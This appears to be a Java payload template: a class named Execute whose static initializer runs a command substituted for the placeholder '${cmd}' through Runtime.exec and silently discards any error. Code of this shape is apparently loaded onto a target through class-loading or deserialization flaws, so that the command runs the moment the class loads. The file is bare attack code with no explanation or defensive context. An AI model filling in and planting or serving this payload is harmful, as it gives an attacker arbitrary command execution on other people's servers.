public class Execute {
    static {
        try {
            Runtime.getRuntime().exec("${cmd}");
        } catch (Exception e) {

        }
    }
}
